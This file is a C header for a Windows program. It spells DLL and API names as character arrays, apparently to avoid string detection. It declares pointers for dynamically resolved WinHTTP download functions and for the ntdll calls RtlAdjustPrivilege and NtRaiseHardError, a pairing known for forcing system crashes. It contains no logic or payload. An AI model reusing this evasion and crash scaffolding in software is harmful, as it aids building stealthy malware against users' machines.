#ifndef _DEFINE_H_
#define _DEFINE_H_
#include <windows.h>
#include <winhttp.h>
#include <winternl.h>

// dll
static char STR_NTDLL[]                     = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0'};
static char STR_WINHTTP[]                   = {'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};


static char STR_LOADLIBRARYA[]              = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0'};
static char STR_GETPROCADDRESS[]            = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0'};

//ntdll.dll
static char STR_RTLADJUSTPRIVILEGE[]        = {'R', 't', 'l', 'A', 'd', 'j', 'u', 's', 't', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e', '\0'};
static char STR_NTRAISEHARDERROR[]          = {'N', 't', 'R', 'a', 'i', 's', 'e', 'H', 'a', 'r', 'd', 'E', 'r', 'r', 'o', 'r', '\0'};

//ntdll.dll
static char STR_WINHTTPOPEN[] 		         = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', '\0'};
static char STR_WINHTTPCONNECT[]            = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', '\0'};
static char STR_WINHTTPOPENREQUEST[]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
static char STR_WINHTTPSENDREQUEST[]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
static char STR_WINHTTPRECEIVERESPONSE[]    = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', '\0'};
static char STR_WINHTTPQUERYHEADERS[]       = {'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', '\0'};
static char STR_WINHTTPQUERYDATAAVAILABLE[] = {'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', '\0'};
static char STR_WINHTTPREADDATA[]           = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', '\0'};
static char STR_WINHTTPCLOSEHANDLE[]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
static char STR_WINHTTPSETOPTION[]          = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', '\0'};


typedef FARPROC(WINAPI* _GetProcAddress)(HMODULE, const char *);
typedef HMODULE(WINAPI* _LoadLibraryA)(const char *);


typedef HINTERNET(WINAPI* _WinHttpOpen) (
	_In_opt_ LPCWSTR pszAgent,
	_In_     DWORD   dwAccessType,
	_In_opt_ LPCWSTR pszProxy,
	_In_opt_ LPCWSTR pszProxyBypass,
	_In_     DWORD   dwFlags
);
typedef HINTERNET (WINAPI* _WinHttpConnect) (
	_In_ HINTERNET     hSession,
	_In_ LPCWSTR       pswzServerName,
	_In_ INTERNET_PORT nServerPort,
	_In_ DWORD         dwReserved
);
typedef HINTERNET (WINAPI* _WinHttpOpenRequest) (
	_In_       HINTERNET hConnect,
	_In_       LPCWSTR   pwszVerb,
	_In_       LPCWSTR   pwszObjectName,
	_In_opt_   LPCWSTR   pwszVersion,
	_In_opt_   LPCWSTR   pwszReferrer,
	_In_opt_z_ LPCWSTR*  ppwszAcceptTypes,
	_In_       DWORD     dwFlags
);
typedef BOOL (WINAPI* _WinHttpSendRequest) (
	_In_                                   HINTERNET hRequest,
	_In_reads_opt_(dwHeadersLength)        LPCWSTR   lpszHeaders,
	_In_                                   DWORD     dwHeadersLength,
	_In_reads_bytes_opt_(dwOptionalLength) LPVOID    lpOptional,
	_In_                                   DWORD     dwOptionalLength,
	_In_                                   DWORD     dwTotalLength,
	_In_                                   DWORD_PTR dwContext
);
typedef BOOL (WINAPI* _WinHttpReceiveResponse) (
	_In_     HINTERNET hRequest,
	_In_opt_ LPVOID    lpReserved
);
typedef BOOL (WINAPI* _WinHttpQueryHeaders) (
  _In_ 	   HINTERNET hRequest,
  _In_ 	   DWORD     dwInfoLevel,
  _In_opt_ LPCWSTR   pwszName,
  _Out_    LPVOID    lpBuffer,
  _Inout_  LPDWORD   lpdwBufferLength,
  _Inout_  LPDWORD   lpdwIndex
);
typedef BOOL (WINAPI* _WinHttpQueryDataAvailable) (
  _In_  HINTERNET hRequest,
  _Out_ LPDWORD   lpdwNumberOfBytesAvailable
);
typedef BOOL (WINAPI* _WinHttpReadData) (
	_In_                                      HINTERNET hRequest,
	_Out_writes_bytes_(dwNumberOfBytesToRead) LPVOID    lpBuffer,
	_In_                                      DWORD     dwNumberOfBytesToRead,
	_Out_                                     LPDWORD   lpdwNumberOfBytesRead
);
typedef BOOL (WINAPI* _WinHttpCloseHandle) (
	_In_ HINTERNET hInternet
);
typedef BOOL (WINAPI* _WinHttpSetOption) (
	_In_                             HINTERNET hInternet,
	_In_                             DWORD     dwOption,
	_In_reads_bytes_(dwBufferLength) LPVOID    lpBuffer,
	_In_                             DWORD     dwBufferLength
);


typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege) (
    ULONG    privilege,
    BOOLEAN  enable,
    BOOLEAN  currentThread,
    PBOOLEAN enabled
);
typedef NTSTATUS(NTAPI* _NtRaiseHardError) (
	NTSTATUS   error_status,
	ULONG      number_of_parameters,
	ULONG      unicode_string_parameter_mask,
	PULONG_PTR parameters,
	ULONG      response_option,
	PULONG     reponse
);


typedef struct _WINDOWS {
	struct {
		HMODULE Ntdll;
		HMODULE Winhttp;
		HMODULE Kernel32;
	} MODULE;
	
	struct {
		_GetProcAddress rGetProcAddress;
		_LoadLibraryA   rLoadLibraryA;
		
		//winhttp.dll
		_WinHttpOpen               rWinHttpOpen;
		_WinHttpConnect            rWinHttpConnect;
		_WinHttpOpenRequest        rWinHttpOpenRequest;
		_WinHttpSendRequest        rWinHttpSendRequest;
		_WinHttpReceiveResponse    rWinHttpReceiveResponse;
		_WinHttpQueryHeaders       rWinHttpQueryHeaders;
		_WinHttpQueryDataAvailable rWinHttpQueryDataAvailable;
		_WinHttpReadData           rWinHttpReadData;
		_WinHttpCloseHandle        rWinHttpCloseHandle;
		_WinHttpSetOption          rWinHttpSetOption;

		//ntdll.dll
		_RtlAdjustPrivilege rRtlAdjustPrivilege;
		_NtRaiseHardError   rNtRaiseHardError;
	} API;
} WINDOWS;


void BindAPI();
extern WINDOWS Win32;
#endif